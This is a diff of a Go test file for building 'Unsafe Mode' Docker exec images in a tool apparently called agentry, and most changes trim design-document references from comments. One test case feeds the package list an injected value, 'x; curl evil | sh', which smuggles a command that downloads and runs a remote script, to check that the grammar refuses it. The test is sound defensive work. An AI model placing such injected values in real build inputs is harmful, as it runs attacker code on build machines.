@@ -59,10 +59,9 @@ func read(t *testing.T, path string) string {
 
 // An Unsafe Mode exec image is built FROM the unsafe base with the runner
 // binary copied in and as the entrypoint, one exec-form RUN of the static
-// install script, and no minimize (D4). No package name, pip requirement
-// or path is written into the Dockerfile or a shell line: the script
-// reads them from the context's files (plan unsafe-mode.md invariant 3).
-// What did not install comes back marked, after what did.
+// install script, and no minimize. No package name, pip requirement or path is
+// written into the Dockerfile or a shell line: the script reads them from the
+// context's files. What did not install comes back marked, after what did.
 func TestEnsureUnsafeExecImageBuildsFromTheBaseWithTheValuesInFiles(t *testing.T) {
 	img := unsafeImage()
 	fake := &dockerx.Fake{ExistingImages: map[string]bool{}, ImageFiles: map[string]string{
@@ -89,7 +88,7 @@ func TestEnsureUnsafeExecImageBuildsFromTheBaseWithTheValuesInFiles(t *testing.T
 	for _, must := range []string{
 		"FROM " + unsafeBase + "\n",
 		"COPY --from=agentry-runner:v1 /usr/local/bin/agentry-runner /usr/local/bin/agentry-runner\n",
-		// export_pdf's renderer travels with the runner (agentry-cli#730).
+		// export_pdf's renderer travels with the runner.
 		"COPY --from=agentry-runner:v1 /opt/agentry/typst /opt/agentry/typst\n",
 		"RUN [\"/bin/sh\", \"/agentry-build/install.sh\"]\n",
 		"ENTRYPOINT [\"/usr/local/bin/agentry-runner\"]\n",
@@ -122,7 +121,7 @@ func TestEnsureUnsafeExecImageBuildsFromTheBaseWithTheValuesInFiles(t *testing.T
 
 // An image whose failure record is empty is reused; one whose last build
 // left tools uninstalled is rebuilt, with a new attempt value that busts
-// the build cache from the install step on (§4.3).
+// the build cache from the install step on.
 func TestUnsafeExecImageIsRebuiltOnlyWhenItsLastBuildFailedSomething(t *testing.T) {
 	img := unsafeImage()
 	clean := &dockerx.Fake{ExistingImages: map[string]bool{img.Tag: true}, ImageFiles: map[string]string{
@@ -153,7 +152,7 @@ func TestUnsafeExecImageIsRebuiltOnlyWhenItsLastBuildFailedSomething(t *testing.
 
 // A plan file is data: an Unsafe Mode exec image whose values fail the
 // grammar (a hand-edited plan, a package that is a shell line) is refused
-// before anything is written or built (invariant 3).
+// before anything is written or built.
 func TestUnsafeExecImageRefusesValuesOutsideTheGrammar(t *testing.T) {
 	for name, edit := range map[string]func(*spec.ExecImageSpec){
 		"a package that is a shell line": func(i *spec.ExecImageSpec) { i.Packages = []string{"x; curl evil | sh"} },
